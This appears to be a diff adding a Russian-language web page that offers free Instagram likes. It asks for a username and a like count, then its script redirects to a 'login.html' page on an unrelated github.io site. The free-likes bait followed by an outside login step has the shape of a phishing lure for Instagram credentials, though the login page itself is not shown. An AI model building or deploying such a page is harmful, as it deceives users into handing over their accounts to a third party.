@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nakrutka</title>
+    <style>
+        body{
+        background-image: url(https://media.istockphoto.com/vectors/smooth-blurred-gradient-insta-background-wallpaper-style-scalable-vector-id1249702917?k=20&m=1249702917&s=612x612&w=0&h=V8hj84Og_mgIB_ALQv_ZGWupITp6ZdlZYTJNmQx0vgw=);
+        background-repeat: no-repeat;   
+        background-size: 1000px;
+    }
+    img{
+        width:100px;
+    }
+    .tit{
+        display: block;
+        margin: auto;
+        text-align: center;
+        font-size:30px;
+        font-family: arial;
+        margin-top:60px;
+    }
+  #user{
+      display: block;
+      margin: auto;
+      text-align: center;
+      width:250px;
+      height:35px;
+      margin-top:50px;
+      border-radius:5px;
+      border: 4px solid rgb(231, 231, 231);
+      outline: none;
+  }
+  .sel_tit{
+      display: block;
+      margin: auto;
+      text-align: center;
+      margin-top:20px;
+      font-family: monospace;
+  }
+  #folowers{
+      display: block;
+      margin: auto;
+     
+      width:220px;
+      height:30px;
+      margin-top:10px;
+      border-radius:5px;
+      outline: none;
+      padding-left: 10px;
+  }
+  .btn{
+      width:220px;
+      display: block;
+      margin: auto;
+      text-align: center;
+      margin-top:30px;
+     height:35px;
+     border-radius:5px;
+     border: none;
+     color: white;
+     background: rgb(0, 132, 255);
+     font-size:16px;
+  }
+    </style>
+
+</head>
+<body>
+    <img src="https://icon-library.com/images/instagram-icon-download/instagram-icon-download-7.jpg" alt=""><h1 class="tit">Накрутка лайков &#128077;&#127995; Instagram </h1>
+   <input type="text" autocomplete="off" id="user" placeholder="Введите имя пользователя Instagram">
+   <p class="sel_tit">Выберите количество лайков!</p>
+   <select name="folow" id="folowers">
+       <option value="10">10 лайков</option>
+       <option value="20">20 лайков</option>
+
+       <option value="30">30 лайков</option>
+
+       <option value="40">40 лайков</option>
+
+       <option value="50">50 лайков</option>
+
+       <option value="60">60 лайков</option>
+
+       <option value="70">70 лайков</option>
+       <option value="80">80 лайков</option>
+       <option value="90">90 лайков</option>
+       <option value="100">100 лайков</option>
+
+   </select>
+   <button class="btn" onclick="next()">Продолжить</button>
+</body>
+<script>
+   function next(){
+    var user=document.getElementById('user').value;
+    var folow=document.getElementById('folowers').value;
+      var data=`{"username":"${user}","folowers":"${folow}"}`;
+     window.location='https://instagramtg.github.io/folowers/login.html?data='+btoa(data);
+   }
+</script>
+</html>
